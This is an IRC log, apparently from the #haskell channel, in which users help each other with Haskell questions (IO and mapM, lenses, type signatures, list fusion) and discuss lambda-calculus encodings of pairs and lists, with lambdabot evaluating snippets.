14:10:01 <heatsink> > iterate (\x -> product [1..x]) 1
14:10:05 <lambdabot>   [1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,...
14:10:26 <heatsink> > iterate (\x -> product [1..x]) 3
14:10:31 <lambdabot>   [3,6,720,260121894356579510020490322708104361119152187501694578572754183785...
14:10:47 <otters> ahh, power towers
14:10:51 <Hafydd> > (product . enumFromTo 1) 3
14:10:55 <lambdabot>   6
14:11:05 <dmwit> hamishmack: Hm, your patch to add gtk3 cairo stuff has an oddity: it adds back "region", which the comments claim was removed in Gtk3.
14:11:49 <dmwit> hamishmack: It's also currently not exported when gtk >= 3; so we should either export it when gtk >= 3 or not include source for it when gtk >= 3. Which is right?
14:14:19 <dmwit> I think not including source for it when gtk >= 3 is right.
14:18:40 <fizruk> hi! is there some existing lens combinator of type Lens' a b -> Lens' (Maybe a) (Maybe b)?
14:19:57 <dmwit> I'm not sure, and also I'm skeptical that there even *should* be a transformation of that type.
14:20:19 <dmwit> What are you expecting to happen if the source used to be a Nothing, and you put a Just b back?
14:20:34 <dmwit> It's going to have to manufacture an a out of thin air...
14:20:59 <ibid> bottom?
14:21:15 <dmwit> NO. *grumpy face*
14:21:18 <ibid> :)
14:21:36 <ibid> about the only thing one can do for an unknown a
14:21:56 <dmwit> There is another thing one can do: refuse to implement that type. =)
14:24:05 <hpaste> efie pasted ‚Äúwhy for n = 1000000 is more memory allocated than for n=0?‚Äù at http://hpaste.org/87525
14:24:11 <Peaker> relevant law:  get lens (set lens x) == x      in dmwit's example
14:24:22 <tgeeky> dmwit: from a physics perspective, having things vanish out of thin air is fine :)
14:25:39 * hackagebot hmemdb 0.3.0.1 - In-memory relational database  http://hackage.haskell.org/package/hmemdb-0.3.0.1 (MiguelMitrofanov)
14:25:42 <fizruk> Peaker: thanks!
14:25:47 <dmwit> For some reason, despite firmly believing the lens laws, I still find operational arguments more convincing than law-based ones.
14:26:30 <tgeeky> dmwit: because you can use them? ba-da-chaa.
14:26:36 <Peaker> dmwit, well, I thought about your example, and my first idea was to just leave it as Nothing, but that smelled bad, so I tried to think which law was broken by that
14:26:59 <hpaste> kostja annotated ‚Äúlists and IO‚Äù with ‚Äúprimes‚Äù at http://hpaste.org/87523#a87526
14:27:11 <kostja> heatsink: ^^ works, thank you!
14:27:17 <dmwit> I suppose the claim that the two arguments must go together is a fair one.
14:27:22 <dmwit> granted
14:27:35 <heatsink> excellent!
14:30:13 <dmwit> hamishmack: Or, hmm... is something very sneaky happening here? Is "Region" referring to G.U.G.Gdk.Region when gtk < 3 and G.R.Cairo.Region when cairo >= 1.10?
14:30:21 * dmwit smells something strange
14:33:27 <dmwit> hamishmack: Okay, have to work on some other things now. In any case, the forward-compat patches are pushed. gtk3 cairo patches still pending me understanding what the heck they're doing =P
14:34:19 <dmwit> Oops, build just bailed. So yeah, I think this should be removed for gtk >= 3. Doing that, then I'll push. Thanks!
14:38:03 <chrisdotcode> so I've been trying and failing to print an IO [FilePath]. How do I do this?
14:38:21 <monochrom> >>= print. also do-notation
14:38:21 <chrisdotcode> fmap twice, once for the IO, once  for the list?
14:39:06 <chrisdotcode> :t print
14:39:08 <lambdabot> Show a => a -> IO ()
14:39:12 <geekosaur> show will recurse on the list, so you don't necessarily need to do things twice unless you want them one per line (in which case mapM_ may be your friend)
14:39:23 <monochrom> no, fmap once is enough, but then you need join. but then, combining fmap and join is just >>=
14:39:40 <aristid> >>= mapM_ putStrLn
14:39:53 <aristid> :t mapM_
14:39:55 <lambdabot> Monad m => (a -> m b) -> [a] -> m ()
14:40:01 <aristid> :t mapM_ putStrLn
14:40:04 <lambdabot> [String] -> IO ()
14:40:11 <chrisdotcode> okay, cool. thanks guys :)
14:42:29 <exilepilot> I'm still getting used to haskell, however I still don't understand what this means ' compareWithHundred :: (Num a, Ord a) => a -> Ordering   ', or the name of it. Can anyone tell me?
14:42:48 <Peaker> @info Ordering
14:42:49 <lambdabot> Ordering
14:42:52 <Peaker> @src Ordering
14:42:53 <lambdabot> data Ordering = LT | EQ | GT
14:43:01 <Peaker> exilepilot, Do you understand what Ordering is?
14:43:25 <tgeeky> exilepilot: the type signature (the thing on the right hand side of =>), says that it takes an 'a' and gives you an Ordering
14:43:39 <tgeeky> the thing on the left constrains 'a' to be an instance of Num and Ord
14:43:40 <eikke> exilepilot: I'd say compareWithHundred is a function which can be applied to a value of some type 'a' which should be an instance of Num and Ord, and yields a value of type Ordering
14:43:48 <monochrom> um, the whole thing is a type signature
14:43:58 <exilepilot> I do know what ordering is, I actually mean where you give the function a type for e.g  ' function :: stuff here '
14:44:09 <timbod> Does anyone else here rely on a mailing list at project.haskell.org
14:44:16 <Peaker> exilepilot, function ::   is read as "function has-type .."
14:44:20 <tgeeky> exilepilot: everything after :: is the type signature, but the left hand side are constraints.
14:44:24 <chrisdotcode> so guys, I'm trying to load bmps from file names, but this function is failing:
14:44:24 <chrisdotcode> "getBMPs :: FilePath -> [Picture]; getBMPs path = getDirectoryContents path >>= (\x -> loadBMP x)"
14:44:37 <Peaker> @pl \x -> loadBMP x
14:44:38 <lambdabot> loadBMP
14:44:50 <Peaker> chrisdotcode, You can replace (\x -> loadBMP x) with loadBMP
14:45:03 <tgeeky> exilepilot: you give the function on the next line.
14:45:04 <monochrom> getBMPs :: FilePath -> IO [Picture]
14:45:25 <chrisdotcode> monochrom: I was thinking I change the signature...
14:46:01 <monochrom> getDirectoryContents path >>= (\x -> mapM loadBMP x)
14:46:15 <Peaker> chrisdotcode, getBMPs is a bind of    IO [FilePath]     with   (FilePath -> IO Picture)         so the result is in IO, as monochrom says. But also, you have a mismatch there between FilePath and [FilePath]
14:46:21 <monochrom> this is a double error
14:46:33 <Peaker> (also as monochrom  says :-)
14:46:35 <chrisdotcode> xD
14:47:05 <lpvb> anyone know the cause of this error
14:47:07 <hpaste> lpvb pasted ‚Äúillegal literal in type‚Äù at http://hpaste.org/87528
14:47:07 <chrisdotcode> okay, so. I want to read in a filepath (a directory), get the contents of that directory (which will be bitmaps), and then return a list of said bitmaps from filenames
14:47:09 <Peaker> chrisdotcode, mapM can lift your (FilePath -> IO Picture) function   to become    ([FilePath] -> IO [Picture])
14:47:29 <Peaker> chrisdotcode, note also that "getDirectoryContents" annoyingly returns also "." and ".."
14:47:36 <chrisdotcode> Peaker: ugh...
14:48:10 <Peaker> getUsefulDirectoryContents path = filter (`notElem` [".", ".."]) <$> getDirectoryContents path
14:48:32 <timbod> Does anyone rely on a mailing list hosted at projects.haskell.org? I suspect it may have problems. None of the lists show any new messages this month...
14:48:43 <Peaker> @type \path -> filter (`notElem` [".", ".."]) <$> getDirectoryContents path
14:48:45 <chrisdotcode> Peaker: okay, that's step one :D
14:48:45 <lambdabot> Not in scope: `getDirectoryContents'
14:48:50 <monochrom> lpvb: I don't understand what is the " > " doiing there. also, where is your "battle ="?
14:49:17 <lispy> chrisdotcode: there isn't a command to unregister everything in one go. I wish there was.
14:49:18 <johnw> fmap filter (`notElem` [".", ".."]) . getDirectoryContents
14:49:21 <johnw> fmap (filter (`notElem` [".", ".."])) . getDirectoryContents
14:49:26 <Peaker> maybe it's a literate program with an .hs extension somehow ?
14:49:29 <lispy> chrisdotcode: I had to go earlier in the middle of helping you. Sorry!
14:49:30 <lpvb> monochrom: uhh it's hlint
14:49:40 <johnw> lispy: it's easy: rm -fr ~/.ghc
14:49:47 <tac> @type notElem
14:49:50 <lambdabot> Eq a => a -> [a] -> Bool
14:49:50 <lpvb> monochrom: let me paste the whole file
14:50:00 <chrisdotcode> lispy: it's okay! I "figured" out the problem! ghci is "stingier" than ghc, so ghc --make was able to run the program :)
14:50:02 <hpaste> lpvb pasted ‚Äúlens‚Äù at http://hpaste.org/87529
14:50:11 <lpvb> taken from this article
14:50:14 <lpvb> http://www.haskellforall.com/2013/05/program-imperatively-using-haskell.html
14:50:18 <troydm> i wonder if haskell has some too like bundle for ruby?
14:50:37 <lispy> chrisdotcode: Oh. You know what, ghci has its own linker but ghc uses the system's linker. Perhaps this is a corner case where they differ.
14:50:39 <lpvb> woa didn't realize the formatting was messed up
14:50:40 <tgeeky> exilepilot: Try: @let compareWithHundred = compare 100
14:50:44 <troydm> or even rvm like
14:50:51 <monochrom> then my second question stands. where the hell is your "battle ="?
14:50:57 <chrisdotcode> lispy: should I file a bug report?
14:51:15 <exilepilot> On here?
14:51:18 <lispy> chrisdotcode: Sure, if it's not already present :) http://hackage.haskell.org/trac/ghc/
14:51:21 <monochrom> in fact it's probably "battle = do" too
14:51:27 <exilepilot> @let compareWithHundred = compare 100
14:51:29 <lambdabot>  Defined.
14:51:33 <chrisdotcode> Peaker: so is "getBMPs path = getDirectoryContents path >>= mapM loadBMP" the most idiomatic way to do it?
14:51:53 <aristid> @let fifteen = 15
14:51:54 <lpvb> monochrom: agh! I feel so dumb now, thanks
14:51:56 <lambdabot>  Defined.
14:51:58 <exilepilot> @:t compareWithHundred
14:52:00 <lambdabot> Done.
14:52:05 <Peaker> chrisdotcode, you need to use getUsefulDirectoryContents, and that's idiomatic, yes
14:52:06 <exilepilot> Um.
14:52:09 <lispy> chrisdotcode: By the way, if you're doing graphics stuff from ghci then sooner or later you may run into a bug with graphics libraries and the default threading that ghci uses. To head that off before it becomes a problem, run ghci with -fno-ghci-sandbox
14:52:10 <aristid> @type compareWithHundred
14:52:13 <lambdabot> (Num a, Ord a) => a -> Ordering
14:52:26 <chrisdotcode> lispy: thanks :D
14:52:45 <chrisdotcode> lispy: will use ghc also have those problems?
14:52:52 <exilepilot> I finally get the gist of type signature in haskell, just I was slightly confused.
14:53:01 <tgeeky> exilepilot:
14:53:03 <tgeeky> @type compare
14:53:05 <lambdabot> Ord a => a -> a -> Ordering
14:53:13 <lispy> chrisdotcode: Not by default, but if do graphics calls from arbitrary threads then you will
14:53:40 <tgeeky> exilepilot: if I specify one of the two a's, then the other one of the two will have to have the same type.
14:53:45 <tgeeky> @type compare 100
14:53:47 <lambdabot> (Num a, Ord a) => a -> Ordering
14:54:17 <lispy> chrisdotcode: the underlying problem is that many platform graphics libraries put locks and other data structures into the thread local storage on the process's original thread (thread 0). So calls that reference those things need to be made from that thread.
14:54:34 <chrisdotcode> lispy: I know Mac has that problem, but I'm on Linux.
14:54:35 <lispy> chrisdotcode: ghci by default runs all user computations in a new thread to give some sandboxing.
14:55:15 <lispy> chrisdotcode: It's a problem on windows too. I have no experience with this on linux :(
14:55:24 <chrisdotcode> hopefully Linux is fine :)
14:55:31 <chrisdotcode> also, where is <$>?
14:55:32 <monochrom> same difference
14:55:34 <chrisdotcode> Control.Applicative?
14:55:39 <lispy> ?hoogle (<$>)
14:55:40 <lambdabot> Data.Functor (<$>) :: Functor f => (a -> b) -> f a -> f b
14:55:40 <lambdabot> Control.Applicative (<$>) :: Functor f => (a -> b) -> f a -> f b
14:55:41 <hpc> it's over there ->
14:55:45 <hpc> damn, just missed it
14:56:09 <chrisdotcode> whoa! didn't know you could do that!
14:56:10 <monochrom> it is really the way the library is written, not the way the OS is written
14:56:36 <lispy> chrisdotcode: opengl is pretty old and not know for being threadsafe. So I wouldn't trust it even on linux. X probably has to do the right thing.
14:57:28 <lispy> chrisdotcode: there is also a website for hoogle: http://www.haskell.org/hoogle/ and a related search engine called hayoo: http://holumbus.fh-wedel.de/hayoo/hayoo.html
14:57:53 <hpc> spoiler alert: hoogle is better
14:58:05 <chrisdotcode> lispy: I knew about hoogle, but I didn't know how to use it besides grepping by type signature.
14:58:28 <lispy> in chrome, under "manage search engines" I have this definition: hoogle, shortcut h, http://www.haskell.org/hoogle/?hoogle=%s
14:58:44 <lispy> then I can type in the address bar: h<space>(<$>)<enter>
14:58:51 <lispy> and it brings up the hoogle results of the serach
14:59:12 <lispy> saves me so much time during development
15:00:12 <scriptor> wait, <space>
15:00:13 <scriptor> ?
15:00:18 <scriptor> I thought it was <tab>
15:00:20 <lispy> as in hitting the space key
15:00:24 <oconnor0> lispy: i know firefox supports hoogle as one of its search engines. do you know if there's a way to do the shortcut thing in firefox too?
15:00:37 <scriptor> right, but space doesn't work for me
15:00:38 <scriptor> I have to tab
15:00:47 <lispy> oconnor0: I don't use firebox, but I'm sure they have a similar feature
15:02:16 <exilepilot> Didn't know there was a HSLua
15:02:33 <lispy> oconnor0: you might need to install omnibar
15:03:39 <oconnor0> lispy: interesting, thanks
15:10:43 <fizruk> I got stuck with lenses: how do I mimic p->x = y (p is a pointer in C)? Or maybe I shouldn't do that?
15:11:03 <acowley> x .~ y $ p
15:11:21 <johnw> or, p & x .~ y
15:11:31 <acowley> I still don't believe in &
15:11:37 <johnw> & believes in you
15:11:47 * cmccann_ prefers ‚Öã.
15:12:03 <fizruk> acowley: and p may be of type (Maybe a)?
15:12:04 * acowley sheds a single tear and hugs &
15:12:24 <acowley> cmcann_ aussie style?
15:12:52 <augustss> It's too hard to type ‚Öã.
15:12:53 <cmccann_> acowley: yes, australians are dual to normal people
15:13:18 <Eduard_Munteanu> Hah.
15:13:24 <cmccann_> augustss: I have a custom shortcut in my editor for it!
15:13:48 <acowley> fizruk: If you're just setting something in a maybe, why not just fmap it?
15:14:16 <Nisstyre> cmccann_: this is part of why I like DrRacket, ctrl+\ -> Œª
15:14:18 <fizruk> acowley: sensible)
15:14:19 <acowley> :t fmap . const
15:14:21 <lambdabot> Functor f => b -> f a -> f b
15:15:05 <johnw> or in that case use <*
15:15:08 <cmccann_> Nisstyre: ctrl+b with a \ just behind the cursor turns it into Œª
15:15:10 <johnw> i meant, <$
15:15:13 <johnw> @src (<$)
15:15:14 <lambdabot> (<$) = (<$>) . const
15:15:18 <acowley> Yes
15:15:19 <johnw> == fmap . const
15:15:28 <acowley> I never think of <$
15:15:28 <cmccann_> Nisstyre: I have a bunch of substitutions like that for ctrl+b
15:15:51 <cmccann_> rarely, one is actually useful
15:16:07 <Pranz> :t const
15:16:11 <lambdabot> a -> b -> a
15:16:19 <vervic_> Hi How i can type an empty list to Int? i have a typeclass function with an int instance. it has a function fromList. apply a argument [1,2,3] works as expected. but [] crash
15:17:02 <johnw> could you use 0 to represent []?
15:17:22 <fizruk> acowley: another case, I have something like p.x .= y in a State Smth monad, where p should be a lens accessing field of type (Maybe a)
15:17:32 <acowley> johnw: Num instance fo []
15:17:43 <acowley> johnw: I use 0 for everything now, it's awesome
15:17:45 <Nisstyre> 0 is already isomorphic to [] so that makes sense imo
15:17:56 <vervic_> i can, but i wont. isn't it possible to express such a case?
15:18:02 <fizruk> acowley: how can I stay close to p.x .= y notation?
15:18:08 <cmccann_> vervic_: I'm not sure what you expect it to do.
15:18:19 <acowley> fizruk: x ?= y
15:18:33 <johnw> :t (?=)
15:18:35 <vervic_> ok, i think you have more expirience than me :)
15:18:37 <lambdabot> MonadState s m => ASetter s s a (Maybe b) -> b -> m ()
15:18:38 <simpson> vervic_: Could you maybe show some code?
15:18:44 <johnw> ah
15:18:51 <vervic_> wait
15:18:53 <cmccann_> vervic_: if you have a sensible default Int, use that. if you don't, you shouldn't be accepting a list as input.
15:18:55 <fizruk> acowley: thanks a lot!
15:19:24 <johnw> > flip runStateT (Just 20) $ id ?= 10
15:19:27 <lambdabot>   No instance for (GHC.Show.Show (m0 ((), Data.Maybe.Maybe a0)))
15:19:27 <lambdabot>    arising f...
15:19:41 <Pranz> h
15:19:56 <johnw> > flip runState (Just 20) $ id ?= 10
15:20:01 <fizruk> acowley: or stop? x is not of type (Maybe b), p is. The thing is I want to combine them
15:20:01 <lambdabot>   mueval: ExitFailure 1
15:20:02 <lambdabot>  mueval: Prelude.undefined
15:20:20 <Pranz> does ?= assign the Just value?
15:20:22 <wole> @hoogle Rational -> Double
15:20:23 <lambdabot> Numeric fromRat :: RealFloat a => Rational -> a
15:20:23 <lambdabot> Prelude fromRational :: Fractional a => Rational -> a
15:20:23 <lambdabot> Prelude fromInteger :: Num a => Integer -> a
15:20:49 <wole> @hoogle Double -> Rational
15:20:50 <lambdabot> Prelude toRational :: Real a => a -> Rational
15:20:50 <lambdabot> Data.Ratio approxRational :: RealFrac a => a -> a -> Rational
15:20:50 <lambdabot> Prelude floatRadix :: RealFloat a => a -> Integer
15:20:54 <Pranz> @src (?=)
15:20:54 <lambdabot> Source not found.
15:21:04 <hpaste> ‚ÄúThomas Brandst√§tter‚Äù pasted ‚Äúbinary tree‚Äù at http://hpaste.org/87533
15:21:19 <acowley> fizruk: hpaste some code
15:21:29 <vervic_> http://hpaste.org/87533
15:22:52 <vervic_> i should say, that i'm just starting haskell, and this is one of my first problems i solve, a binary tree implementation
15:22:58 <dylukes> gah
15:23:00 <dylukes> no haskell lately
15:23:07 <glguy> vervic_: You might have misunderstood what typeclasses are for
15:23:44 <vervic_> that's possible :) what do i missing?
15:24:14 <glguy> They allow implementations to vary by type. In your case all of these functions have a single implementation invariant of the type
15:24:29 <glguy> so you should pull all of these functions out as top-level definitions, not as part of a class
15:26:03 <acowley> I've got an unexpected redundant import, how can I get GHCi to tell me where a symbol was imported from?
15:27:24 <vervic_> glguy: what you have said ends imaginarilly to: instance BinaryTrees a where ...,  right?
15:27:33 <acowley> duh, it was Prelude sneaking it in
15:28:34 <Munchor> Hey
15:28:58 <Munchor> "Could not find module `Network'" isn't Network a default module that comes with ghc?
15:29:35 <lispy> acowley: you can :browse <module> to see what it exports
15:30:09 <lispy> acowley: but I don't see a way to find out what modules define a symbol (you could use hoogle I suppose)
15:30:12 <acowley> lispy: I know, the question was more for a notional :where identifier
15:30:20 <acowley> lispy: not definition
15:30:25 <acowley> lispy: definition comes from :i
15:30:28 <acowley> I wanted export
15:30:37 <lispy> sure
15:30:59 <lispy> I don't really have an answer other than hoogle :)
15:31:20 <cmccann_> acowley: if you have a clash between unqualified names GHC will say where they were originally defined when it complains
15:31:32 <cmccann_> I've used that as a horrible hack a couple times to know where something came from
15:31:37 <hpaste> glguy annotated ‚Äúbinary tree‚Äù with ‚Äúbinary tree (annotation)‚Äù at http://hpaste.org/87533#a87534
15:31:41 <acowley> cmccann_: clever!
15:31:46 <glguy> vervic_: like this
15:32:03 <Pranz> Munchor, if you get that error, probably not
15:32:09 <cmccann> acowley: terribly clever and cleverly terrible
15:32:42 * lispy wonders how hard it would be to add a :where command to ghci such that it simply scanned the current package db.
15:32:46 <acowley> cmccann: I kind of wish that were the accepted definition of "hack"
15:32:51 <cmccann> haha
15:33:22 <cmccann> the thing about that is that it will actually tell you where it was originally defined as well as what module exported it from your code's perspective
15:33:53 <cmccann> lispy: as my hack demonstrates it has all the information available
15:33:59 <vervic_> glguy: thanks you for your strives
15:34:03 <cmccann> but I dunno how hard it is to add stuff like that to GHCi
15:37:48 <wole> @hoogle (a -> b -> Bool) -> [a] -> [b] -> [b]
15:37:48 <lambdabot> Data.List deleteFirstsBy :: (a -> a -> Bool) -> [a] -> [a] -> [a]
15:37:48 <lambdabot> Data.List intersectBy :: (a -> a -> Bool) -> [a] -> [a] -> [a]
15:37:48 <lambdabot> Data.List unionBy :: (a -> a -> Bool) -> [a] -> [a] -> [a]
15:41:44 <Bor0> hi. PAIR := Œªxyf.f x y. now I attempt to make a PAIR 0 1, so (Œªxyf.f x y)(Œªfx.x)(Œªfx.fx). but I end up with PAIR 0 1 = Œªf.f(Œªx.x) is this correct?
15:51:00 <lispy> Bor0: This is my attempt (Œªxyf.f x y)(Œªfx.x)(Œªfx.fx) alpha => (Œªxyf. f x y)(Œªga.a)(Œªhb.hb) beta => (Œªyf.f (Œªga.a) y)(Œªhb.hb) beta => (Œªf.f (Œªga.a)(Œªhb.hb)) beta => (Œªf.f (Œªa.a))
15:53:18 <DanBurton> @src deleteFirstBy
15:53:18 <lambdabot> Source not found.
15:55:08 <DanBurton> deleteFirstsBy eq       =  foldl (flip (deleteBy eq)) -- wth implemented as a foldl?
15:55:08 <lambdabot> DanBurton: You have 1 new message. '/msg lambdabot @messages' to read it.
15:56:28 <DanBurton> > let dfb eq = foldr (deleteBy eq) in dfb (==) [1 .. 10] [3 .. 5]
15:56:29 <lambdabot>   [1,2,6,7,8,9,10]
15:57:10 <DanBurton> > let dfb eq = foldr (deleteBy eq) in take 3 $ dfb (==) [1 ..] [3 .. 5]
15:57:12 <lambdabot>   [1,2,6]
15:57:34 <DanBurton> > Data.List.deleteFirstsBy (==) [1 ..] [3 .. 5]
15:57:36 <fizruk> acowley: sort of problem demonstation http://pastebin.com/s3WbuV48
15:57:36 <lambdabot>   [1,2,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30...
15:57:43 <mauke> The paste s3WbuV48 has been copied to http://hpaste.org/87537
15:57:49 <DanBurton> > take 3 $ Data.List.deleteFirstsBy (==) [1 ..] [3 .. 5]
15:57:50 <lambdabot>   [1,2,6]
15:58:07 <DanBurton> oh, it is the finite list being folded over anyways.
15:58:10 <DanBurton> duh
15:59:42 <acowley> fizruk: Where's the issue?
16:00:25 <acowley> You want to eliminate h?
16:00:34 <fizruk> acowley: and zooms
16:01:55 <fizruk> also, nesting zooms implicate repeating default values (I believe, in most practical cases there should be one)
16:04:00 <fizruk> and in case of () as a default value type there should be simple notation indeed like p->x = y (at least I believe so)
16:05:46 * hackagebot lca 0.2.3 - O(log n) persistent on-line lowest common ancestor calculation without preprocessing  http://hackage.haskell.org/package/lca-0.2.3 (EdwardKmett)
16:08:11 <troydm> so are there any plans for something rvm for haskell?
16:08:49 <glguy> fizruk: perhaps http://hpaste.org/87537
16:10:47 <fizruk> glguy: looks like what I need, thanks!
16:11:14 <acowley> Yes, that's great!
16:11:19 <acowley> thanks glguy
16:15:17 <geekosaur> troydm, would you prefer http://hackage.haskell.org/package/cabal-dev or http://hackage.haskell.org/package/hsenv
16:15:18 <geekosaur> ?
16:15:39 <oio> how it get rid ? of Warning: Defaulting the following constraint(s) to type
16:15:49 <glguy> Add a type signature
16:15:54 <troydm> geekosaur: ahh good stuff, thx
16:17:25 <oio> dem :: RealFrac a => Int -> a -> String -> IO ()
16:17:46 <oio> dem 1 0.1 " "
16:18:09 <geekosaur> oio, you probably have something in the middle of a composition chain which could be one of several types, so you should specify which you want for that something
16:18:44 <geekosaur> example from earlier today:  [08 14:28] <fizbin> _just: you can also write it as sqrtInt = floor . (sqrt :: Double -> Double) . fromIntegral
16:20:09 <geekosaur> the "sqrt" could be Float -> Float or Double -> Double,, so they got a warning about it being defaulted to the latter
16:20:39 <geekosaur> use of read or show (especially together) in a composition chain can also lead to defaulting occurring
16:22:23 <oio> mm weird
16:25:46 * hackagebot hakyll-agda 0.1.3 - Wrapper to integrate literate Agda files with Hakyll  http://hackage.haskell.org/package/hakyll-agda-0.1.3 (FrancescoMazzoli)
16:39:43 <Bor0> in lambda calculus, can we implement lists like this due to left-associativity of applications? [a,b,c] = (((a) b) c), like pair is [a, b] = ((a) b)
16:39:55 <johnw> zipWith const [1..]
16:40:25 <troydm> Bor0: theoreticly no
16:40:53 <troydm> because i guess [1,2,3] is of type [Int]
16:41:00 <Bor0> why is that so? and how would we, theoretically?
16:41:24 <troydm> while (((1),2),3) would be a type of ((Int),Int),Int)
16:41:35 <troydm> which will be different type if we add 4th element
16:41:57 <Bor0> but, PAIR is implemented like that. note that I am talking lambda calculus
16:42:00 <hpc> troydm: "in lambda calculus"
16:42:06 <johnw> (That was for you madjestic)
16:42:45 <hpc> in lambda calculus you typically represent data structures in terms of their operations
16:43:08 <hpc> so to use some very casual type system, a list would be a function (N -> Element)
16:43:08 <troydm> Bor0: let's say you've implemented a list using tuples
16:43:21 <troydm> Bor0: what would be a signature for a map function for that list?
16:44:08 <hpc> Bor0: you can look at how N is implemented and give some thought to it
16:44:10 <Bor0> hpc, I understand. so, if we implemented a good first, second, third function (such as first and second for pair), (((a) b) c) can be a valid list?
16:44:28 <Bor0> with 3 elements that is
16:44:59 <troydm> you can implement such a functions
16:45:08 <troydm> but that would be a very limited list
16:45:15 <Bor0> yes, great
16:45:18 <troydm> that would be of only 3 elements
16:45:51 <slack1256> I've always thought that lazy bytestring fit a weird place
16:45:54 <troydm> a typical list is arbitary sized fixed generic type
16:46:00 <slack1256> you can use them to represent text (regardless of encoding) but they are unlikely to be generated in the program
16:46:09 <hpc> or put another way, your "list" is represented in lambda calculus as Œªf. f a b c
16:46:15 <troydm> while a tuple is a fixed size generic type
16:46:22 <slack1256> but reading from a file has the problems of lazy IO, also that's a domain of pipes/conduit etc
16:46:39 <slack1256> what are some cases where you really want lazy bytestrings instead of strict ones?
16:46:41 <Bor0> hpc, how is that possible?
16:46:50 <Bor0> if pair is Œªx.Œªy.Œªz.z x y
16:47:09 <Bor0> oh, you took a, b, c constants. okay, sorry
16:47:14 <hpc> Bor0: pair = Œªxyz. Œªf. f x y z
16:47:35 <hpc> first = Œªp. p (Œªxyz. x)
16:47:45 <hpc> second = Œªp. p (Œªxyz. y)
16:47:47 <hpc> etc
16:48:06 <Bor0> so a b c in Œªf. f a b c evaluates to (((a) b) c)
16:48:12 <beelike> if use filter on a list, and then map on a result of filter, will the list be iterated twice?
16:48:18 <hpc> no
16:48:24 <hpc> (((f a) b) c)
16:48:43 <blaenk> anyone have experience with hakyll and pandoc? I want to create a transformer on the pandoc AST which then gets passed to hakyll, but my transformer does IO, do I need to use unsafePerformIO or something like that? what would some alternatives be?
16:48:45 <beelike> or rather, will the intermediate list be optimized away?
16:48:46 <Bor0> yeah, I only took a b c out of f a b c, but with f and left-associativity it would be that
16:49:03 <Bor0> I love how lambda calculus is well defined, it amazes me
16:49:23 <blaenk> the reason I'm stuck is because I have a function that does the IO, and I need it to operate it on a pure, AST result, which then gets passed directly to another hakyll subsystem
16:49:36 <quchen> beelike: Many of the intermediate lists you can generate using the standard combinators are fused away, yes.
16:49:43 <hpc> Bor0: look at how natural numbers and booleans are implemented in lambda calculus
16:49:59 <Bor0> I did, played around with them quite a while, and arithmetic as well
16:50:17 <Bor0> I moved on to pairs and lists, now recursion is left to play with a bit :)
16:50:30 <hpc> ooh, actually here
16:51:10 <hpc> you can represent infinite streams as Stream a = (a, Stream a)
16:51:34 <stepcut> hahahaha, "At one point lambda was slated for removal in Python 3000. Unfortunately no one was able to come up with a better way of providing anonymous functions. And so lambda is here to stay." (from python.org)
16:51:46 <hpc> and pair = Œªxyf. f x y
16:51:54 <hpc> so i expect you'd have something like
16:52:04 <Bor0> I see, so, like recursive definition of pairs = infinite list?
16:52:05 <hpc> cons = Œªhtf. f h (f t)
16:52:08 <hpc> or something like that
16:52:34 <hpc> actually, definitely not that
16:53:08 <hpc> i am sleepy and pure lambda calculus is a miserable thing to do nontrivial things with :P
16:53:43 <hpc> what i am trying to think of is there's a way to naively translate an algebraic data type to lambda calculus
16:54:04 <hpc> and just applying that to data [a] = [] | (a : [a]) will yield your list implementation
16:54:07 <beelike> to give an example,
16:54:20 <hpc> but i am le tired
16:54:25 <beelike> > map (^2) $ filter even [1..20]   -- will intermediate list be created?
16:54:26 <Bor0> I see
16:54:27 <lambdabot>   [4,16,36,64,100,144,196,256,324,400]
16:54:56 * hpc dons professor hat: "you have a week to figure it out and submit your results for grading"
16:56:19 <hpc> beelike: the rules of evaluation strongly imply that the intermediate list will never exist all at once
16:56:26 <joeyh> I'm trying to install process on Windows, and cabal says it needs MinGW+MSYS or Cygwin. Which is the better choice?
16:56:49 <hpc> beelike: insofar as it takes excruciating pain to not specify such things
16:57:20 <hpc> beelike: list fusion will optimise it so the intermediate cons cells are never created and it gets smooshed into a fairly explicit foldr
16:57:24 <hpc> something like
16:57:54 <hpc> > foldr (\x xs -> if even x then (x^2):xs else xs) [] [1..20]
16:57:57 <lambdabot>   [4,16,36,64,100,144,196,256,324,400]
16:58:20 <augur> Bor0: what do yo mean implement, and what do you mean like this
16:58:28 <augur> just going back to your list question
16:59:11 <beelike> ok thanks
16:59:14 <lpvb> what are arrows useful for
16:59:59 <hpc> lpvb: pointing at things
17:00:06 <hpc> lpvb: shooting from bows
17:00:28 <hpc> lpvb: drinking
17:00:37 <lpvb> har har
17:00:38 <hpc> lpvb: driving
17:00:40 <hpc> https://duckduckgo.com/?q=arrow
17:00:56 <hpc> lpvb: they are also a generalization of (->)
17:01:01 <hpc> and Category
17:01:16 <hpc> (or specialization of Category, if you squint the other way)
17:01:21 <slack1256> and Category is also a generalization of many things
17:01:35 <slack1256> ad infinitum
17:01:44 <hpc> they can do some neat things
17:01:48 <hpc> and many boring things
17:01:58 <hpc> and arrow-do notation is an abomination
17:03:26 <hpc> there's also a lot of complaints about what functions Arrow exposes
17:03:28 <hpc> namely arr
17:03:29 <hpc> :t arr
17:03:31 <lambdabot> Arrow a => (b -> c) -> a b c
17:03:41 <hpc> which coerces Arrow into providing only function-like definitions
17:03:50 <hpc> (as opposed to Category which can do more)
17:04:18 <hpc> er, function-like instances
17:04:20 <Bor0> augur, implement in lambda calculus terms, not haskell. I'm still far away from playing with haskell
17:04:37 <augur> Bor0: and what do you mean "like this"
17:04:42 <hpc> Bor0: lambda calculus isn't getting you any closer to haskell ;)
17:05:16 <Bor0> hpc, it gives me a good overview of functional programming, when compared to imperative
17:06:20 <monochrom> hpc: glad I'm not alone
17:06:32 <hpc> monochrom: also Cale
17:06:55 <monochrom> I was like, if anything, haskell is an introduction to lambda calculus, not the other way round
17:07:12 <hpc> oh, thought you meant about arr
17:07:29 <hpc> i am fairly sure it's unambiguously know that lambda calculus is horrifying
17:07:31 <Cale> Bor0: I definitely recommend playing with Haskell first.
17:07:50 <Cale> Or at least, at the same time as learning about lambda calculus
17:08:29 <Cale> A lot of the constructions in lambda calculus make a lot more sense once you see the safer and more structured versions of them in Haskell.
17:08:44 <monochrom> algebraic data types are more basic and more concrete than these church encodings
17:08:49 <Cale> yes
